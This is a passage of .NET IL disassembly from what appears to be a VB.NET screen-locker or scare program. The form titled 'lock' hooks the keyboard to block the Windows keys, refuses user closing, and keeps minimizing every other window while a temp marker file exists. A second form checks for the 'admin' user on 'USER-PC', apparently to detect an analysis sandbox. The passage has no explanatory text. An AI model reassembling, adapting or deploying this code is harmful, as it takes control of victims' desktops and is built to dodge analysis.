    IL_0048:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_004d:  ldarg.0
    IL_004e:  ldc.i4.0
    IL_004f:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ControlBox(bool)
    IL_0054:  ldarg.0
    IL_0055:  ldc.i4.0
    IL_0056:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_005b:  ldarg.0
    IL_005c:  ldc.i4.1
    IL_005d:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_KeyPreview(bool)
    IL_0062:  ldarg.0
    IL_0063:  ldstr      "Form1"
    IL_0068:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_006d:  ldarg.0
    IL_006e:  ldc.r8     0.5
    IL_0077:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Opacity(float64)
    IL_007c:  ldarg.0
    IL_007d:  ldc.i4.0
    IL_007e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowInTaskbar(bool)
    IL_0083:  ldarg.0
    IL_0084:  ldc.i4.1
    IL_0085:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_StartPosition(valuetype [System.Windows.Forms]System.Windows.Forms.FormStartPosition)
    IL_008a:  ldarg.0
    IL_008b:  ldstr      "lock"
    IL_0090:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_0095:  ldarg.0
    IL_0096:  ldc.i4.2
    IL_0097:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_009c:  ldarg.0
    IL_009d:  ldc.i4.0
    IL_009e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_00a3:  ret
  } // end of method Form1::InitializeComponent

  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  8
    IL_0000:  ldnull
    IL_0001:  ldftn      native int Form1::HookCallback(int32,
                                                        native int,
                                                        native int)
    IL_0007:  newobj     instance void Form1/LowLevelKeyboardProc::.ctor(object,
                                                                         native int)
    IL_000c:  stsfld     class Form1/LowLevelKeyboardProc Form1::_proc
    IL_0011:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0016:  stsfld     native int Form1::_hookID
    IL_001b:  ret
  } // end of method Form1::.cctor

  .method private instance void  Form1_KeyDown(object sender,
                                               class [System.Windows.Forms]System.Windows.Forms.KeyEventArgs e) cil managed
  {
    // Code size       40 (0x28)
    .maxstack  8
    IL_0000:  ldarg.2
    IL_0001:  callvirt   instance valuetype [System.Windows.Forms]System.Windows.Forms.Keys [System.Windows.Forms]System.Windows.Forms.KeyEventArgs::get_KeyData()
    IL_0006:  ldc.i4     0x40009
    IL_000b:  bne.un.s   IL_0027

    IL_000d:  ldarg.0
    IL_000e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0013:  ldarg.0
    IL_0014:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_0019:  ldarg.0
    IL_001a:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_001f:  pop
    IL_0020:  ldarg.2
    IL_0021:  ldc.i4.1
    IL_0022:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.KeyEventArgs::set_Handled(bool)
    IL_0027:  ret
  } // end of method Form1::Form1_KeyDown

  .method private instance void  Form1_FormClosed(object sender,
                                                  class [System.Windows.Forms]System.Windows.Forms.FormClosedEventArgs e) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldsfld     native int Form1::_hookID
    IL_0005:  call       native int Form1::UnhookWindowsHookEx(native int)
    IL_000a:  pop
    IL_000b:  ret
  } // end of method Form1::Form1_FormClosed

  .method private instance void  Form1_FormClosing(object sender,
                                                   class [System.Windows.Forms]System.Windows.Forms.FormClosingEventArgs e) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  8
    IL_0000:  ldarg.2
    IL_0001:  callvirt   instance valuetype [System.Windows.Forms]System.Windows.Forms.CloseReason [System.Windows.Forms]System.Windows.Forms.FormClosingEventArgs::get_CloseReason()
    IL_0006:  ldc.i4.3
    IL_0007:  bne.un.s   IL_0010

    IL_0009:  ldarg.2
    IL_000a:  ldc.i4.1
    IL_000b:  callvirt   instance void [System]System.ComponentModel.CancelEventArgs::set_Cancel(bool)
    IL_0010:  ret
  } // end of method Form1::Form1_FormClosing

  .method public static native int  HookCallback(int32 nCode,
                                                 native int wParam,
                                                 native int lParam) cil managed
  {
    // Code size       102 (0x66)
    .maxstack  4
    .locals init (valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.0
    IL_0002:  clt
    IL_0004:  ldc.i4.0
    IL_0005:  ceq
    IL_0007:  ldarg.1
    IL_0008:  ldc.i4     0x101
    IL_000d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
    IL_0012:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                   native int)
    IL_0017:  and
    IL_0018:  brfalse.s  IL_0058

    IL_001a:  ldarg.2
    IL_001b:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt32(native int)
    IL_0020:  stloc.0
    IL_0021:  ldloc.0
    IL_0022:  ldc.i4.s   91
    IL_0024:  ceq
    IL_0026:  ldloc.0
    IL_0027:  ldc.i4.s   92
    IL_0029:  ceq
    IL_002b:  or
    IL_002c:  brfalse.s  IL_0058

    .try
    {
      IL_002e:  ldc.i4     0xfb
      IL_0033:  ldc.i4.0
      IL_0034:  ldc.i4.1
      IL_0035:  conv.i8
      IL_0036:  ldc.i4.0
      IL_0037:  conv.i8
      IL_0038:  call       void Form1::keybd_event(uint8,
                                                   uint8,
                                                   int64,
                                                   int64)
      IL_003d:  leave.s    IL_0058

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003f:  dup
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0045:  stloc.1
      IL_0046:  ldloc.1
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  leave.s    IL_0058

    }  // end handler
    IL_0058:  ldsfld     native int Form1::_hookID
    IL_005d:  ldarg.0
    IL_005e:  ldarg.1
    IL_005f:  ldarg.2
    IL_0060:  call       native int Form1::CallNextHookEx(native int,
                                                          int32,
                                                          native int,
                                                          native int)
    IL_0065:  ret
  } // end of method Form1::HookCallback

  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method family hidebysig specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.CreateParams 
          get_CreateParams() cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance class [System.Windows.Forms]System.Windows.Forms.CreateParams [System.Windows.Forms]System.Windows.Forms.Form::get_CreateParams()
    IL_0006:  dup
    IL_0007:  dup
    IL_0008:  callvirt   instance int32 [System.Windows.Forms]System.Windows.Forms.CreateParams::get_ClassStyle()
    IL_000d:  ldc.i4     0x200
    IL_0012:  or
    IL_0013:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.CreateParams::set_ClassStyle(int32)
    IL_0018:  ret
  } // end of method Form1::get_CreateParams

  .method private static pinvokeimpl("user32.dll" as "SendMessageA" nomangle ansi lasterr winapi) 
          int32  SendMessage(native int hWnd,
                             int32 Msg,
                             int32 wParam,
                             int32 lParam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          bool  IsIconic(native int hWnd) cil managed preservesig
  {
  }
  .method private instance void  Form1_Load(object sender,
                                            class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       256 (0x100)
    .maxstack  4
    .locals init (native int V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [System]System.Diagnostics.Process V_3,
             native int V_4)
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0006:  ldarg.0
    IL_0007:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_000c:  ldarg.0
    IL_000d:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_0012:  pop
    IL_0013:  ldsfld     class Form1/LowLevelKeyboardProc Form1::_proc
    IL_0018:  call       native int Form1::SetHook(class Form1/LowLevelKeyboardProc)
    IL_001d:  stsfld     native int Form1::_hookID
    IL_0022:  br         IL_00e0

    IL_0027:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
    IL_002c:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_0031:  stloc.0
    IL_0032:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
    IL_0037:  stloc.1
    IL_0038:  ldc.i4.0
    IL_0039:  stloc.2
    IL_003a:  br         IL_00bf

    IL_003f:  ldloc.1
    IL_0040:  ldloc.2
    IL_0041:  ldelem.ref
    IL_0042:  stloc.3
    IL_0043:  ldloc.3
    IL_0044:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_0049:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_004e:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                     native int)
    IL_0053:  brfalse.s  IL_00bb

    IL_0055:  ldloc.3
    IL_0056:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_005b:  ldloc.0
    IL_005c:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                     native int)
    IL_0061:  brfalse.s  IL_00bb

    IL_0063:  ldloc.3
    IL_0064:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_0069:  stloc.s    V_4
    IL_006b:  ldloca.s   V_4
    IL_006d:  ldarg.0
    IL_006e:  call       instance native int [System.Windows.Forms]System.Windows.Forms.Control::get_Handle()
    IL_0073:  box        [mscorlib]System.IntPtr
    IL_0078:  constrained. [mscorlib]System.IntPtr
    IL_007e:  callvirt   instance bool [mscorlib]System.Object::Equals(object)
    IL_0083:  brtrue.s   IL_00bb

    IL_0085:  ldloc.3
    IL_0086:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_008b:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0090:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                     native int)
    IL_0095:  brfalse.s  IL_00bb

    IL_0097:  ldloc.3
    IL_0098:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_009d:  call       bool Form1::IsIconic(native int)
    IL_00a2:  brtrue.s   IL_00bb

    IL_00a4:  ldloc.3
    IL_00a5:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_00aa:  ldc.i4     0x112
    IL_00af:  ldc.i4     0xf020
    IL_00b4:  ldc.i4.0
    IL_00b5:  call       int32 Form1::SendMessage(native int,
                                                  int32,
                                                  int32,
                                                  int32)
    IL_00ba:  pop
    IL_00bb:  ldloc.2
    IL_00bc:  ldc.i4.1
    IL_00bd:  add.ovf
    IL_00be:  stloc.2
    IL_00bf:  ldloc.2
    IL_00c0:  ldloc.1
    IL_00c1:  ldlen
    IL_00c2:  conv.i4
    IL_00c3:  blt        IL_003f

    IL_00c8:  ldarg.0
    IL_00c9:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_00ce:  ldarg.0
    IL_00cf:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_00d4:  pop
    IL_00d5:  ldarg.0
    IL_00d6:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_00db:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_00e0:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_00e5:  ldstr      "\\select.dat"
    IL_00ea:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00ef:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_00f4:  brtrue     IL_0027

    IL_00f9:  ldarg.0
    IL_00fa:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_00ff:  ret
  } // end of method Form1::Form1_Load

  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  CallNextHookEx(native int hhk,
                                     int32 nCode,
                                     native int wParam,
                                     native int lParam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          void  keybd_event(uint8 bVk,
                            uint8 bScan,
                            int64 dwFlags,
                            int64 dwExtraInfo) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" autochar lasterr winapi) 
          native int  GetModuleHandle(string& lpModuleName) cil managed preservesig
  {
  }
  .method private static native int  SetHook(class Form1/LowLevelKeyboardProc proc) cil managed
  {
    // Code size       33 (0x21)
    .maxstack  4
    .locals init (string V_0)
    IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
    IL_0005:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
    IL_000a:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_ModuleName()
    IL_000f:  stloc.0
    IL_0010:  ldc.i4.s   13
    IL_0012:  ldarg.0
    IL_0013:  ldloca.s   V_0
    IL_0015:  call       native int Form1::GetModuleHandle(string&)
    IL_001a:  ldc.i4.0
    IL_001b:  call       native int Form1::SetWindowsHookEx(int32,
                                                            class Form1/LowLevelKeyboardProc,
                                                            native int,
                                                            uint32)
    IL_0020:  ret
  } // end of method Form1::SetHook

  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  SetWindowsHookEx(int32 idHook,
                                       class Form1/LowLevelKeyboardProc lpfn,
                                       native int hMod,
                                       uint32 dwThreadId) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  UnhookWindowsHookEx(native int hhk) cil managed preservesig
  {
  }
  .method private instance void  unfuck() cil managed
  {
    // Code size       1 (0x1)
    .maxstack  8
    IL_0000:  ret
  } // end of method Form1::unfuck

  .property instance class [System.Windows.Forms]System.Windows.Forms.CreateParams
          CreateParams()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.CreateParams Form1::get_CreateParams()
  } // end of property Form1::CreateParams
} // end of class Form1

.class public auto ansi Form2
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private class [System]System.ComponentModel.IContainer components
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void Form2::Form2_Load(object,
                                                         class [mscorlib]System.EventArgs)
    IL_000e:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_0018:  ldarg.0
    IL_0019:  call       instance void Form2::InitializeComponent()
    IL_001e:  ret
  } // end of method Form2::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer Form2::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer Form2::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method Form2::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       172 (0xac)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_0006:  ldarg.0
    IL_0007:  ldc.r4     6.
    IL_000c:  ldc.r4     13.
    IL_0011:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0016:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_001b:  ldarg.0
    IL_001c:  ldc.i4.1
    IL_001d:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_0022:  ldarg.0
    IL_0023:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Fuchsia()
    IL_0028:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_002d:  ldarg.0
    IL_002e:  ldc.i4.s   70
    IL_0030:  ldc.i4.s   24
    IL_0032:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_0037:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_003c:  ldarg.0
    IL_003d:  ldc.i4.0
    IL_003e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ControlBox(bool)
    IL_0043:  ldarg.0
    IL_0044:  ldc.i4.0
    IL_0045:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_004a:  ldarg.0
    IL_004b:  ldc.i4.0
    IL_004c:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_MaximizeBox(bool)
    IL_0051:  ldarg.0
    IL_0052:  ldc.i4.0
    IL_0053:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_MinimizeBox(bool)
    IL_0058:  ldarg.0
    IL_0059:  ldstr      "Form2"
    IL_005e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_0063:  ldarg.0
    IL_0064:  ldc.r8     0.0
    IL_006d:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Opacity(float64)
    IL_0072:  ldarg.0
    IL_0073:  ldc.i4.0
    IL_0074:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowIcon(bool)
    IL_0079:  ldarg.0
    IL_007a:  ldc.i4.0
    IL_007b:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowInTaskbar(bool)
    IL_0080:  ldarg.0
    IL_0081:  ldc.i4.1
    IL_0082:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_StartPosition(valuetype [System.Windows.Forms]System.Windows.Forms.FormStartPosition)
    IL_0087:  ldarg.0
    IL_0088:  ldstr      "Form2"
    IL_008d:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_0092:  ldarg.0
    IL_0093:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Fuchsia()
    IL_0098:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_TransparencyKey(valuetype [System.Drawing]System.Drawing.Color)
    IL_009d:  ldarg.0
    IL_009e:  ldc.i4.1
    IL_009f:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_00a4:  ldarg.0
    IL_00a5:  ldc.i4.0
    IL_00a6:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_00ab:  ret
  } // end of method Form2::InitializeComponent

  .method private instance void  Form2_Load(object sender,
                                            class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       102 (0x66)
    .maxstack  4
    IL_0000:  call       string [mscorlib]System.Environment::get_UserName()
    IL_0005:  ldstr      "admin"
    IL_000a:  ldc.i4.0
    IL_000b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0010:  ldc.i4.0
    IL_0011:  ceq
    IL_0013:  call       string [System.Windows.Forms]System.Windows.Forms.SystemInformation::get_ComputerName()
    IL_0018:  ldstr      "USER-PC"
    IL_001d:  ldc.i4.0
    IL_001e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0023:  ldc.i4.0
    IL_0024:  ceq
    IL_0026:  and
    IL_0027:  brfalse.s  IL_005f

    IL_0029:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_002e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0033:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0038:  ldstr      "sand.dat"
    IL_003d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0042:  ldc.i4.1
    IL_0043:  callvirt   instance class [mscorlib]System.IO.StreamWriter [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::OpenTextFileWriter(string,
                                                                                                                                                                     bool)
    IL_0048:  dup
    IL_0049:  ldstr      "001"
    IL_004e:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
    IL_0053:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
    IL_0058:  ldarg.0
    IL_0059:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_005e:  ret

    IL_005f:  ldarg.0
    IL_0060:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_0065:  ret
  } // end of method Form2::Form2_Load

} // end of class Form2

.class public auto ansi frmSustos
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private class [System]System.ComponentModel.IContainer components
  .field private class [System.Windows.Forms]System.Windows.Forms.PictureBox _PictureBox1
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.AccessedThroughPropertyAttribute::.ctor(string) = ( 01 00 0B 50 69 63 74 75 72 65 42 6F 78 31 00 00 ) // ...PictureBox1..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void frmSustos::frmSustos_Load(object,
                                                                 class [mscorlib]System.EventArgs)
    IL_000e:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_0018:  ldarg.0
    IL_0019:  call       instance void frmSustos::InitializeComponent()
    IL_001e:  ret
  } // end of method frmSustos::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer frmSustos::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer frmSustos::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method frmSustos::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       268 (0x10c)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::.ctor()
    IL_0006:  callvirt   instance void frmSustos::set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox)
    IL_000b:  ldarg.0
    IL_000c:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0011:  callvirt   instance void [System]System.ComponentModel.ISupportInitialize::BeginInit()
    IL_0016:  ldarg.0
    IL_0017:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_001c:  ldarg.0
    IL_001d:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0022:  ldc.i4.5
    IL_0023:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Dock(valuetype [System.Windows.Forms]System.Windows.Forms.DockStyle)
    IL_0028:  ldarg.0
    IL_0029:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_002e:  ldc.i4.0
    IL_002f:  ldc.i4.0
    IL_0030:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                   int32)
    IL_0035:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Location(valuetype [System.Drawing]System.Drawing.Point)
    IL_003a:  ldarg.0
    IL_003b:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0040:  ldstr      "PictureBox1"
    IL_0045:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_004a:  ldarg.0
    IL_004b:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0050:  ldc.i4     0x3f1
    IL_0055:  ldc.i4     0x27e
    IL_005a:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_005f:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Size(valuetype [System.Drawing]System.Drawing.Size)
    IL_0064:  ldarg.0
    IL_0065:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_006a:  ldc.i4.1
    IL_006b:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_SizeMode(valuetype [System.Windows.Forms]System.Windows.Forms.PictureBoxSizeMode)
    IL_0070:  ldarg.0
    IL_0071:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0076:  ldc.i4.0
    IL_0077:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_TabIndex(int32)
    IL_007c:  ldarg.0
    IL_007d:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0082:  ldc.i4.0
    IL_0083:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_TabStop(bool)
    IL_0088:  ldarg.0
    IL_0089:  ldc.r4     6.
    IL_008e:  ldc.r4     13.
    IL_0093:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0098:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_009d:  ldarg.0
    IL_009e:  ldc.i4.1
